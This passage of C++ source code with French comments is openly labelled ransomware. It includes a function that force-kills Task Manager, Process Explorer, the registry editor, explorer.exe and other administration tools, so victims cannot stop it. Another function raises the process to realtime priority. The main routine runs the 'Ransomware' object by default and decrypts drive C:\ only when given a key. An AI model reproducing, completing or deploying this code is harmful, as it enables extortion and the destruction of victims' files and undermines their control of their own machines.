    return true;
}

// Fonction pour tuer les processus essentiels
void killEssentialProcesses() {
    // Liste des processus à terminer
    const std::vector<std::string> processes = {
        "taskmgr.exe",    // Gestionnaire des tâches
        "procexp.exe",    // Process Explorer
        "procexp64.exe",  // Process Explorer 64 bits
        "regedit.exe",    // Éditeur du Registre
        "explorer.exe",   // Explorateur Windows (bureau)
        "msconfig.exe",   // Configuration système
        "perfmon.exe",    // Moniteur de performances
        "services.msc",   // Services
        "mmc.exe",        // Console de gestion Microsoft
        "compmgmt.msc",   // Gestion de l'ordinateur
        "secpol.msc",     // Stratégie de sécurité locale
        "eventvwr.msc"    // Observateur d'événements
    };
    
    for (const auto& process : processes) {
        std::string cmd = "taskkill /F /IM " + process + " >nul 2>&1";
        system(cmd.c_str());
    }
}

// Fonction pour optimiser la priorité du processus
void setHighestPriority() {
    // Définir la priorité du processus actuel à REALTIME
    SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
    
    // Définir la priorité du thread principal à CRITICAL
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
    
    // Optimiser les I/O du processus
    SetProcessWorkingSetSize(GetCurrentProcess(), 16 * 1024 * 1024, 256 * 1024 * 1024); // Min 16MB, Max 256MB
    
    // Désactiver l'économiseur d'écran et la mise en veille
    SetThreadExecutionState(ES_CONTINUOUS | ES_SYSTEM_REQUIRED | ES_DISPLAY_REQUIRED);
    
    // Augmenter la priorité des I/O
    HANDLE hToken;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        TOKEN_PRIVILEGES tp;
        LUID luid;
        
        if (LookupPrivilegeValue(NULL, SE_INC_BASE_PRIORITY_NAME, &luid)) {
            tp.PrivilegeCount = 1;
            tp.Privileges[0].Luid = luid;
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            
            AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
        }
        
        CloseHandle(hToken);
    }
}
#endif

int main(int argc, char* argv[]) {
#ifdef _WIN32
    // Configurer la console
    setupConsole();
#endif

    // Initialiser OpenSSL
    OpenSSL_add_all_algorithms();
    
    // Afficher la bannière
    std::cout << BANNER << std::endl;
    
    // Vérifier les arguments
    if (argc > 1) {
        std::string arg = argv[1];
        
        // Mode déchiffrement (lorsque l'utilisateur entre une clé)
        if (arg == "--decrypt" && argc > 2) {
            std::string keyPath = argv[2];
            
            // Vérifier que le fichier de clé existe
            std::ifstream keyFile(keyPath);
            if (!keyFile) {
                std::cerr << "[-] Erreur: Impossible d'ouvrir le fichier de clé: " << keyPath << std::endl;
                MessageBoxA(NULL, "Clé de déchiffrement invalide ou corrompue.\nVeuillez vérifier que vous avez entré la bonne clé.", 
                         "Erreur de déchiffrement", MB_ICONERROR);
                return 1;
            }
            
            std::cout << "[*] Mode déchiffrement activé avec la clé: " << keyPath << std::endl;
            
            try {
                // Afficher un message de confirmation
                MessageBoxA(NULL, "Le déchiffrement de vos fichiers va commencer.\nCe processus peut prendre plusieurs minutes.\nUne fenêtre de console affichera la progression.", 
                         "Déchiffrement en cours", MB_ICONINFORMATION);
                
                // Créer et exécuter le déchiffreur
                Decryptor decryptor(keyPath);
                decryptor.run("C:\\");
                
                // Afficher un message de succès à la fin
                MessageBoxA(NULL, "Déchiffrement terminé avec succès!\nVos fichiers sont maintenant récupérés.", 
                         "Déchiffrement terminé", MB_ICONINFORMATION);
            } catch (const std::exception& e) {
                std::cerr << "[-] Erreur lors du déchiffrement: " << e.what() << std::endl;
                MessageBoxA(NULL, "Une erreur s'est produite pendant le déchiffrement.\nCertains fichiers n'ont peut-être pas été récupérés.", 
                         "Erreur de déchiffrement", MB_ICONERROR);
                return 1;
            }
            
            return 0;
        }
    }
    
    // Par défaut, mode chiffrement
    std::cout << "[*] Mode chiffrement activé" << std::endl;
    
    // Créer la structure de données partagées pour l'interface utilisateur
    SharedData* sharedData = new SharedData();
    sharedData->totalFiles = 1000; // Valeur initiale estimée
    sharedData->processedFiles = 0;
    sharedData->currentFileName = "";
    sharedData->decryptMode = false;
    
    // Créer et exécuter le ransomware en lui passant les données partagées
    Ransomware ransomware(sharedData);
    ransomware.run();
    
    // Nettoyer la mémoire (ce code ne sera jamais atteint en pratique)
    delete sharedData;
    
    return 0;
} 